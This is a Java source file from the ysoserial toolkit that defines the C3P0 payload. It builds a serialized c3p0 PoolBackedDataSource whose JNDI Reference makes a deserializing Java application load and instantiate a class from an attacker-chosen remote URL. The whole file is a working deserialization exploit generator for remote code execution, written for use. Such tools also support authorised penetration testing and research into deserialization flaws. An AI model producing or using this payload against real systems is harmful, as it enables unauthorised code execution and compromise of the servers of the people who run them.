/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 27.02.2016 by mbechler
 */
package ysoserial.payloads;

import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import sun.reflect.ReflectionFactory;
import ysoserial.NoTest;
import ysoserial.payloads.util.PayloadRunner;

/**
 * 
 * 
 * com.sun.jndi.rmi.registry.RegistryContext->lookup 
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 * 
 * Arguments:
 * - base_url:classname
 * 
 * Yields:
 * - Instantiation of remotely loaded class
 * 
 * @author mbechler
 *
 */
@SuppressWarnings({"javadoc", "nls", "restriction"})
@NoTest("Remote loading")
public class C3P0 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);
        Constructor<Object> objCons = Object.class.getDeclaredConstructor();
        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Constructor<?> sc = rf.newConstructorForSerialization(PoolBackedDataSource.class, objCons);
        sc.setAccessible(true);
        PoolBackedDataSource b = (PoolBackedDataSource) sc.newInstance();
        Field dsF = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource"); //$NON-NLS-1$
        dsF.setAccessible(true);
        dsF.set(b, new PoolSource(className, url));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        
        private String className;
        private String url;
        /**
         * @param className
         * @param url
         */
        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
        
    }
    

    public static void main ( final String[] args ) throws Exception {
        Object o = PayloadRunner.run(C3P0.class, args);
        System.out.println(o);
    }

}
